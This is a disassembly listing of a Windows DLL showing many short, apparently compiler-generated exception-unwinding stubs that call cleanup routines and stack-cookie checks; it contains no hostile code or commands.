sub_100810bb
lea ecx [ ebp - 0x144 ]
jmp sub_10014510
sub_100810c6
lea ecx [ ebp - 0x154 ]
jmp sub_10014510
sub_100810d1
lea ecx [ ebp - 0x164 ]
jmp sub_10014510
sub_100810dc
lea ecx [ ebp - 0x17c ]
jmp sub_10014510
sub_100810e7
lea edi [ ebp - 0xc4 ]
jmp sub_1002eb30
sub_100810f2
lea edi [ ebp - 0xc4 ]
jmp sub_1002eb30
sub_100810fd
lea edi [ ebp - 0xc4 ]
jmp sub_1002eb30
sub_10081108
lea edi [ ebp - 0xc4 ]
jmp sub_1002eb30
sub_10081113
lea edi [ ebp - 0xc4 ]
jmp sub_1002eb30
sub_1008111e
lea edi [ ebp - 0xc4 ]
jmp sub_1002eb30
sub_10081129
lea edi [ ebp - 0xc4 ]
jmp sub_1002eb30
sub_10081134
lea edi [ ebp - 0xd4 ]
jmp sub_1002eb30
sub_1008113f
lea ecx [ ebp - 0x164 ]
jmp sub_10014510
sub_1008114a
lea ecx [ ebp - 0x154 ]
jmp sub_10014510
sub_10081155
lea ecx [ ebp - 0x144 ]
jmp sub_10014510
sub_10081160
lea edi [ ebp - 0xd4 ]
jmp sub_1002eb30
sub_1008116b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x180 ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_100811a0
mov eax [ ebp - 0x10 ]
push eax
call sub_1006591f
pop ecx
retn
sub_100811ab
mov eax [ ebp - 0x10 ]
push eax
call sub_1006591f
pop ecx
retn
sub_100811b6
mov eax [ ebp - 0x10 ]
push eax
call sub_1006591f
pop ecx
retn
sub_100811c1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_100811e0
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x18 ]
push ecx
call sub_1003bee0
add esp 0x8
retn
sub_100811f1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10081210
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10081240
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0x8 ]
jmp sub_10061060
sub_10081259
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10081280
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_100812a0
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x10 ]
push ecx
call sub_1003bee0
add esp 0x8
retn
sub_100812b1
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x10 ]
push ecx
call sub_1003bee0
add esp 0x8
retn
sub_100812c2
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_100812e0
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x14 ]
push ecx
call sub_1003bee0
add esp 0x8
retn
sub_100812f1
mov eax [ ebp - 0x14 ]
push eax
mov ecx [ ebp - 0x10 ]
push ecx
call sub_1003bee0
add esp 0x8
retn
sub_10081302
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10081320
lea ecx [ ebp - 0x154 ]
jmp sub_10061060
sub_1008132b
lea ecx [ ebp - 0x154 ]
jmp sub_10061060
sub_10081336
lea ecx [ ebp - 0x154 ]
jmp sub_10061060
sub_10081341
lea ecx [ ebp - 0x154 ]
jmp sub_10061060
sub_1008134c
lea ecx [ ebp - 0x154 ]
jmp sub_10061060
sub_10081357
lea ecx [ ebp - 0x154 ]
jmp sub_10061060
sub_10081362
lea ecx [ ebp - 0x154 ]
jmp sub_10061060
sub_1008136d
lea ecx [ ebp - 0x154 ]
jmp sub_10061060
sub_10081378
lea ecx [ ebp - 0x154 ]
jmp sub_10061060
sub_10081383
lea ecx [ ebp - 0x154 ]
jmp sub_10061060
sub_1008138e
lea ecx [ ebp - 0x154 ]
jmp sub_10061060
sub_10081399
lea ecx [ ebp - 0x154 ]
jmp sub_10061060
sub_100813a4
lea ecx [ ebp - 0x154 ]
jmp sub_10061060
sub_100813af
lea ecx [ ebp - 0x154 ]
jmp sub_10061060
sub_100813ba
lea ecx [ ebp - 0x154 ]
jmp sub_10061060
sub_100813c5
lea ecx [ ebp - 0x154 ]
jmp sub_10061060
sub_100813d0
lea ecx [ ebp - 0x154 ]
jmp sub_10061060
sub_100813db
lea ecx [ ebp - 0x154 ]
jmp sub_10061060
sub_100813e6
lea ecx [ ebp - 0x154 ]
jmp sub_10061060
sub_100813f1
lea ecx [ ebp - 0x154 ]
jmp sub_10061060
sub_100813fc
lea ecx [ ebp - 0x154 ]
jmp sub_10061060
sub_10081407
lea ecx [ ebp - 0x154 ]
jmp sub_10061060
sub_10081412
lea ecx [ ebp - 0x154 ]
jmp sub_10061060
sub_1008141d
lea ecx [ ebp - 0x154 ]
jmp sub_10061060
sub_10081428
lea ecx [ ebp - 0x154 ]
jmp sub_10061060
sub_10081433
lea ecx [ ebp - 0x154 ]
jmp sub_10061060
sub_1008143e
lea ecx [ ebp - 0x154 ]
jmp sub_10061060
sub_10081449
lea ecx [ ebp - 0x154 ]
jmp sub_10061060
sub_10081454
lea ecx [ ebp - 0x154 ]
jmp sub_10061060
sub_1008145f
lea ecx [ ebp - 0x154 ]
jmp sub_10061060
sub_1008146a
lea ecx [ ebp - 0x154 ]
jmp sub_10061060
sub_10081475
lea ecx [ ebp - 0x154 ]
jmp sub_10061060
sub_10081480
lea ecx [ ebp - 0x154 ]
jmp sub_10061060
sub_1008148b
lea ecx [ ebp - 0x154 ]
jmp sub_10061060
sub_10081496
lea ecx [ ebp - 0x154 ]
jmp sub_10061060
sub_100814a1
lea ecx [ ebp - 0x154 ]
jmp sub_10061060
sub_100814ac
lea ecx [ ebp - 0x154 ]
jmp sub_10061060
sub_100814b7
lea ecx [ ebp - 0x154 ]
jmp sub_10061060
sub_100814c2
lea ecx [ ebp - 0x154 ]
jmp sub_10061060
sub_100814cd
lea ecx [ ebp - 0x154 ]
jmp sub_10061060
sub_100814d8
lea ecx [ ebp - 0x154 ]
jmp sub_10061060
sub_100814e3
lea ecx [ ebp - 0x154 ]
jmp sub_10061060
sub_100814ee
lea ecx [ ebp - 0x154 ]
jmp sub_10061060
sub_100814f9
lea ecx [ ebp - 0x154 ]
jmp sub_10061060
sub_10081504
lea ecx [ ebp - 0x154 ]
jmp sub_10061060
sub_1008150f
lea ecx [ ebp - 0x154 ]
jmp sub_10061060
sub_1008151a
lea ecx [ ebp - 0x154 ]
jmp sub_10061060
sub_10081525
lea ecx [ ebp - 0x154 ]
jmp sub_10061060
sub_10081530
lea ecx [ ebp - 0x154 ]
jmp sub_10061060
sub_1008153b
lea ecx [ ebp - 0x170 ]
jmp sub_10061060
sub_10081546
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1ac ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10081570
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
mov ecx [ ebp + 0x8 ]
jmp sub_10061060
sub_10081589
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_100815b0
mov eax [ ebp - 0x38 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x38 ] 0xfffffffe
mov ecx [ ebp - 0x3c ]
jmp sub_1001e530
sub_100815c9
lea ecx [ ebp - 0x2c ]
jmp sub_10061060
sub_100815d1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x38 ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10081600
lea ecx [ ebp - 0xbc ]
jmp sub_10061060
sub_1008160b
lea ecx [ ebp - 0x84 ]
jmp sub_10061060
sub_10081616
lea ecx [ ebp - 0x180 ]
jmp sub_10061060
sub_10081621
lea ecx [ ebp - 0x190 ]
jmp sub_1001e530
sub_1008162c
lea ecx [ ebp - 0xd8 ]
jmp sub_10061060
sub_10081637
lea ecx [ ebp - 0x12c ]
jmp sub_10061060
sub_10081642
lea ecx [ ebp - 0x110 ]
jmp sub_10061060
sub_1008164d
lea ecx [ ebp - 0xa0 ]
jmp sub_10061060
sub_10081658
lea ecx [ ebp - 0x4c ]
jmp sub_10061060
sub_10081660
lea ecx [ ebp - 0x148 ]
jmp sub_10061060
sub_1008166b
lea ecx [ ebp - 0x30 ]
jmp sub_10061060
sub_10081673
lea ecx [ ebp - 0x164 ]
jmp sub_10061060
sub_1008167e
lea ecx [ ebp - 0xf4 ]
jmp sub_10061060
sub_10081689
lea ecx [ ebp - 0x30 ]
jmp sub_10061060
sub_10081691
lea ecx [ ebp - 0x68 ]
jmp sub_10061060
sub_10081699
lea ecx [ ebp - 0x4c ]
jmp sub_10061060
sub_100816a1
lea ecx [ ebp - 0x30 ]
jmp sub_10061060
sub_100816a9
lea ecx [ ebp - 0x68 ]
jmp sub_10061060
sub_100816b1
lea ecx [ ebp - 0x4c ]
jmp sub_10061060
sub_100816b9
lea ecx [ ebp - 0x30 ]
jmp sub_10061060
sub_100816c1
lea ecx [ ebp - 0x68 ]
jmp sub_10061060
sub_100816c9
lea ecx [ ebp - 0x4c ]
jmp sub_10061060
sub_100816d1
lea ecx [ ebp - 0x30 ]
jmp sub_10061060
sub_100816d9
lea ecx [ ebp - 0x68 ]
jmp sub_10061060
sub_100816e1
lea ecx [ ebp - 0x4c ]
jmp sub_10061060
sub_100816e9
lea ecx [ ebp - 0x30 ]
jmp sub_10061060
sub_100816f1
lea ecx [ ebp - 0x68 ]
jmp sub_10061060
sub_100816f9
lea ecx [ ebp - 0x4c ]
jmp sub_10061060
sub_10081701
lea ecx [ ebp - 0x30 ]
jmp sub_10061060
sub_10081709
lea ecx [ ebp - 0x68 ]
jmp sub_10061060
sub_10081711
lea ecx [ ebp - 0x4c ]
jmp sub_10061060
sub_10081719
lea ecx [ ebp - 0x30 ]
jmp sub_10061060
sub_10081721
lea ecx [ ebp - 0x68 ]
jmp sub_10061060
sub_10081729
lea ecx [ ebp - 0x4c ]
jmp sub_10061060
sub_10081731
lea ecx [ ebp - 0x30 ]
jmp sub_10061060
sub_10081739
lea ecx [ ebp - 0x68 ]
jmp sub_10061060
sub_10081741
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c8 ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10081770
lea esi [ ebp - 0x114 ]
jmp sub_10027d70
sub_1008177b
lea ecx [ ebp - 0x130 ]
jmp sub_10061060
sub_10081786
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x140 ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_100817b0
lea ecx [ ebp - 0x120 ]
jmp sub_1001e530
sub_100817bb
lea ecx [ ebp - 0x84 ]
jmp sub_10061060
sub_100817c6
lea ecx [ ebp - 0xbc ]
jmp sub_10061060
sub_100817d1
lea ecx [ ebp - 0xd8 ]
jmp sub_10061060
sub_100817dc
lea ecx [ ebp - 0x110 ]
jmp sub_10061060
sub_100817e7
lea ecx [ ebp - 0xa0 ]
jmp sub_10061060
sub_100817f2
lea ecx [ ebp - 0x68 ]
jmp sub_10061060
sub_100817fa
lea ecx [ ebp - 0x4c ]
jmp sub_10061060
sub_10081802
lea ecx [ ebp - 0x30 ]
jmp sub_10061060
sub_1008180a
lea ecx [ ebp - 0x68 ]
jmp sub_10061060
sub_10081812
lea ecx [ ebp - 0x30 ]
jmp sub_10061060
sub_1008181a
lea ecx [ ebp - 0x4c ]
jmp sub_10061060
sub_10081822
lea ecx [ ebp - 0x68 ]
jmp sub_10061060
sub_1008182a
lea ecx [ ebp - 0x30 ]
jmp sub_10061060
sub_10081832
lea ecx [ ebp - 0x4c ]
jmp sub_10061060
sub_1008183a
lea ecx [ ebp - 0x68 ]
jmp sub_10061060
sub_10081842
lea ecx [ ebp - 0x30 ]
jmp sub_10061060
sub_1008184a
lea ecx [ ebp - 0x4c ]
jmp sub_10061060
sub_10081852
lea ecx [ ebp - 0xf4 ]
jmp sub_10061060
sub_1008185d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x138 ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10081890
lea ecx [ ebp - 0x164 ]
jmp sub_10061060
sub_1008189b
lea ecx [ ebp - 0x30 ]
jmp sub_10061060
sub_100818a3
lea ecx [ ebp - 0x68 ]
jmp sub_10061060
sub_100818ab
lea ecx [ ebp - 0xbc ]
jmp sub_10061060
sub_100818b6
lea ecx [ ebp - 0x174 ]
jmp sub_1001e530
sub_100818c1
lea ecx [ ebp - 0xd8 ]
jmp sub_10061060
sub_100818cc
lea ecx [ ebp - 0x110 ]
jmp sub_10061060
sub_100818d7
lea ecx [ ebp - 0x68 ]
jmp sub_10061060
sub_100818df
lea ecx [ ebp - 0xf4 ]
jmp sub_10061060
sub_100818ea
lea ecx [ ebp - 0xa0 ]
jmp sub_10061060
sub_100818f5
lea ecx [ ebp - 0x68 ]
jmp sub_10061060
sub_100818fd
lea ecx [ ebp - 0x12c ]
jmp sub_10061060
sub_10081908
lea ecx [ ebp - 0x84 ]
jmp sub_10061060
sub_10081913
lea ecx [ ebp - 0x4c ]
jmp sub_10061060
sub_1008191b
lea ecx [ ebp - 0x30 ]
jmp sub_10061060
sub_10081923
lea ecx [ ebp - 0x84 ]
jmp sub_10061060
sub_1008192e
lea ecx [ ebp - 0x30 ]
jmp sub_10061060
sub_10081936
lea ecx [ ebp - 0x4c ]
jmp sub_10061060
sub_1008193e
lea ecx [ ebp - 0x84 ]
jmp sub_10061060
sub_10081949
lea ecx [ ebp - 0x30 ]
jmp sub_10061060
sub_10081951
lea ecx [ ebp - 0x4c ]
jmp sub_10061060
sub_10081959
lea ecx [ ebp - 0x84 ]
jmp sub_10061060
sub_10081964
lea ecx [ ebp - 0x30 ]
jmp sub_10061060
sub_1008196c
lea ecx [ ebp - 0x4c ]
jmp sub_10061060
sub_10081974
lea ecx [ ebp - 0x84 ]
jmp sub_10061060
sub_1008197f
lea ecx [ ebp - 0x30 ]
jmp sub_10061060
sub_10081987
lea ecx [ ebp - 0x4c ]
jmp sub_10061060
sub_1008198f
lea ecx [ ebp - 0x148 ]
jmp sub_10061060
sub_1008199a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x190 ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_100819d0
lea ecx [ ebp - 0x100 ]
jmp sub_1001e530
sub_100819db
lea ecx [ ebp - 0x64 ]
jmp sub_10061060
sub_100819e3
lea ecx [ ebp - 0x2c ]
jmp sub_10061060
sub_100819eb
lea ecx [ ebp - 0xd4 ]
jmp sub_10061060
sub_100819f6
lea ecx [ ebp - 0xf0 ]
jmp sub_10061060
sub_10081a01
lea ecx [ ebp - 0xb8 ]
jmp sub_10061060
sub_10081a0c
lea ecx [ ebp - 0x9c ]
jmp sub_10061060
sub_10081a17
lea ecx [ ebp - 0x48 ]
jmp sub_10061060
sub_10081a1f
lea ecx [ ebp - 0x2c ]
jmp sub_10061060
sub_10081a27
lea ecx [ ebp - 0x9c ]
jmp sub_10061060
sub_10081a32
lea ecx [ ebp - 0x2c ]
jmp sub_10061060
sub_10081a3a
lea ecx [ ebp - 0x48 ]
jmp sub_10061060
sub_10081a42
lea ecx [ ebp - 0x9c ]
jmp sub_10061060
sub_10081a4d
lea ecx [ ebp - 0x2c ]
jmp sub_10061060
sub_10081a55
lea ecx [ ebp - 0x48 ]
jmp sub_10061060
sub_10081a5d
lea ecx [ ebp - 0x80 ]
jmp sub_10061060
sub_10081a65
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x124 ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10081a90
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x18 ]
push ecx
call sub_1003bee0
add esp 0x8
retn
sub_10081aa1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10081ac0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10081ae0
mov esi [ ebp - 0x10 ]
add esi 0x4
jmp sub_1002f7a0
sub_10081aeb
mov esi [ ebp - 0x10 ]
add esi 0x18
jmp sub_10028360
sub_10081af6
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10081b20
mov esi [ ebp - 0x10 ]
jmp sub_10023cd0
sub_10081b28
mov ecx [ ebp - 0x10 ]
add ecx 0x94
jmp sub_10029c40
sub_10081b36
mov esi [ ebp - 0x10 ]
add esi 0xb4
jmp sub_1002abe0
sub_10081b44
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10081b60
mov esi [ ebp + 0x8 ]
jmp sub_10023cd0
sub_10081b68
mov ecx [ ebp + 0x8 ]
add ecx 0x94
jmp sub_10029c40
sub_10081b76
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10081ba0
mov eax [ ebp - 0x78 ]
jmp sub_10040d90
sub_10081ba8
lea eax [ ebp - 0x7c ]
jmp sub_10044190
sub_10081bb0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x80 ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10081be0
lea ecx [ ebp - 0x2c ]
jmp sub_10029c40
sub_10081be8
lea ecx [ ebp - 0x2c ]
jmp sub_10029c40
sub_10081bf0
lea ecx [ ebp - 0x2c ]
jmp sub_10029c40
sub_10081bf8
lea ecx [ ebp - 0x48 ]
jmp sub_10029c40
sub_10081c00
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x48 ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10081c30
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10081c50
lea ecx [ ebp - 0x44 ]
jmp sub_10029c40
sub_10081c58
mov ecx [ ebp - 0x4c ]
add ecx 0x4
jmp sub_10029c40
sub_10081c63
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x50 ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10081c90
lea ecx [ ebp - 0xac ]
jmp sub_10061060
sub_10081c9b
lea ecx [ ebp - 0xc8 ]
jmp sub_10061060
sub_10081ca6
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xcc ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10081cd0
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0x8 ]
jmp sub_10029c40
sub_10081ce9
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10081d10
mov ecx [ ebp - 0x34 ]
add ecx 0x8
jmp sub_10061060
sub_10081d1b
mov ecx [ ebp - 0x34 ]
add ecx 0x24
jmp sub_10061060
sub_10081d26
mov esi [ ebp - 0x34 ]
add esi 0x50
jmp sub_10061020
sub_10081d31
mov ecx [ ebp - 0x34 ]
add ecx 0x60
jmp sub_10029c40
sub_10081d3c
mov ecx [ ebp - 0x34 ]
add ecx 0x7c
jmp sub_10029c40
sub_10081d47
lea ecx [ ebp - 0x2c ]
jmp sub_10061060
sub_10081d4f
lea ecx [ ebp - 0x2c ]
jmp sub_10061060
sub_10081d57
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10081d80
mov ecx [ ebp - 0x70 ]
add ecx 0x8
jmp sub_10061060
sub_10081d8b
mov ecx [ ebp - 0x70 ]
add ecx 0x24
jmp sub_10061060
sub_10081d96
mov esi [ ebp - 0x70 ]
add esi 0x50
jmp sub_10061020
sub_10081da1
mov ecx [ ebp - 0x70 ]
add ecx 0x60
jmp sub_10029c40
sub_10081dac
mov ecx [ ebp - 0x70 ]
add ecx 0x7c
jmp sub_10029c40
sub_10081db7
lea ecx [ ebp - 0x68 ]
jmp sub_10061060
sub_10081dbf
lea esi [ ebp - 0x4c ]
jmp sub_10027d70
sub_10081dc7
lea esi [ ebp - 0x4c ]
jmp sub_10027d70
sub_10081dcf
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x70 ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10081e00
lea ecx [ ebp - 0x154 ]
jmp sub_1001e530
sub_10081e0b
lea ecx [ ebp - 0x9c ]
jmp sub_10061060
sub_10081e16
lea ecx [ ebp - 0x10c ]
jmp sub_10061060
sub_10081e21
lea ecx [ ebp - 0xb8 ]
jmp sub_10061060
sub_10081e2c
lea ecx [ ebp - 0x80 ]
jmp sub_10061060
sub_10081e34
lea ecx [ ebp - 0x48 ]
jmp sub_10061060
sub_10081e3c
lea ecx [ ebp - 0x128 ]
jmp sub_10061060
sub_10081e47
lea ecx [ ebp - 0x2c ]
jmp sub_10061060
sub_10081e4f
lea ecx [ ebp - 0xf0 ]
jmp sub_10061060
sub_10081e5a
lea ecx [ ebp - 0xd4 ]
jmp sub_10061060
sub_10081e65
lea ecx [ ebp - 0x2c ]
jmp sub_10061060
sub_10081e6d
lea ecx [ ebp - 0x64 ]
jmp sub_10061060
sub_10081e75
lea ecx [ ebp - 0x48 ]
jmp sub_10061060
sub_10081e7d
lea ecx [ ebp - 0x2c ]
jmp sub_10061060
sub_10081e85
lea ecx [ ebp - 0x64 ]
jmp sub_10061060
sub_10081e8d
lea ecx [ ebp - 0x48 ]
jmp sub_10061060
sub_10081e95
lea ecx [ ebp - 0x2c ]
jmp sub_10061060
sub_10081e9d
lea ecx [ ebp - 0x64 ]
jmp sub_10061060
sub_10081ea5
lea ecx [ ebp - 0x48 ]
jmp sub_10061060
sub_10081ead
lea ecx [ ebp - 0x2c ]
jmp sub_10061060
sub_10081eb5
lea ecx [ ebp - 0x64 ]
jmp sub_10061060
sub_10081ebd
lea ecx [ ebp - 0x48 ]
jmp sub_10061060
sub_10081ec5
lea ecx [ ebp - 0x2c ]
jmp sub_10061060
sub_10081ecd
lea ecx [ ebp - 0x64 ]
jmp sub_10061060
sub_10081ed5
lea ecx [ ebp - 0x48 ]
jmp sub_10061060
sub_10081edd
lea ecx [ ebp - 0x2c ]
jmp sub_10061060
sub_10081ee5
lea ecx [ ebp - 0x64 ]
jmp sub_10061060
sub_10081eed
lea ecx [ ebp - 0x48 ]
jmp sub_10061060
sub_10081ef5
lea ecx [ ebp - 0x2c ]
jmp sub_10061060
sub_10081efd
lea ecx [ ebp - 0x64 ]
jmp sub_10061060
sub_10081f05
lea ecx [ ebp - 0x48 ]
jmp sub_10061060
sub_10081f0d
lea ecx [ ebp - 0x2c ]
jmp sub_10061060
sub_10081f15
lea ecx [ ebp - 0x144 ]
jmp sub_10061060
sub_10081f20
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x194 ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10081f50
mov eax [ ebp - 0x4c ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x4c ] 0xfffffffe
lea ecx [ ebp - 0x48 ]
jmp sub_10029c40
sub_10081f69
mov eax [ ebp - 0x4c ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0x4c ] 0xfffffffd
lea ecx [ ebp - 0x2c ]
jmp sub_10029c40
sub_10081f82
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4c ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10081fb0
mov eax [ ebp - 0x54 ]
push eax
call sub_1006591f
pop ecx
retn
sub_10081fbb
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x58 ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10081fe0
mov esi [ ebp - 0x6c ]
add esi 0x4
jmp sub_1002f7a0
sub_10081feb
mov ecx [ ebp - 0x6c ]
add ecx 0x2c
jmp sub_10029c40
sub_10081ff6
mov ecx [ ebp - 0x6c ]
add ecx 0x48
jmp sub_10029c40
sub_10082001
mov ecx [ ebp - 0x6c ]
add ecx 0x64
jmp sub_10029c40
sub_1008200c
mov ecx [ ebp - 0x6c ]
add ecx 0x80
jmp sub_10029c40
sub_1008201a
mov ecx [ ebp - 0x6c ]
add ecx 0xa0
jmp sub_10061060
sub_10082028
mov esi [ ebp - 0x6c ]
add esi 0xc4
jmp sub_1002f7a0
sub_10082036
mov eax [ ebp - 0x6c ]
add eax 0xd4
push eax
call sub_100449e0
retn
sub_10082045
mov ecx [ ebp - 0x6c ]
add ecx 0xe8
jmp sub_10029c40
sub_10082053
mov ecx [ ebp - 0x6c ]
add ecx 0x11c
jmp sub_10029c40
sub_10082061
lea ecx [ ebp - 0x2c ]
jmp sub_10029c40
sub_10082069
lea ecx [ ebp - 0x48 ]
jmp sub_10061060
sub_10082071
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x6c ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_100820a0
lea ecx [ ebp - 0x2c ]
jmp sub_10029c40
sub_100820a8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_100820d0
lea ecx [ ebp + 0x5c ]
jmp sub_10061060
sub_100820d8
lea ecx [ ebp + 0x40 ]
jmp sub_10061060
sub_100820e0
lea ecx [ ebp + 0x24 ]
jmp sub_10061060
sub_100820e8
lea ecx [ ebp + 0x8 ]
jmp sub_10061060
sub_100820f0
mov eax [ ebp - 0x34 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x34 ] 0xfffffffe
mov esi [ ebp - 0x38 ]
jmp sub_10054dd0
sub_10082109
lea ecx [ ebp - 0x2c ]
jmp sub_10029c40
sub_10082111
lea ecx [ ebp - 0x2c ]
jmp sub_10029c40
sub_10082119
lea ecx [ ebp - 0x2c ]
jmp sub_10029c40
sub_10082121
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x38 ]
xor ecx eax
call sub_10024145
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10024145
mov eax r--data
jmp sub_100101a1
sub_10082150
mov esi [ ebp - 0x10 ]
add esi 0x4
jmp sub_1002f7a0
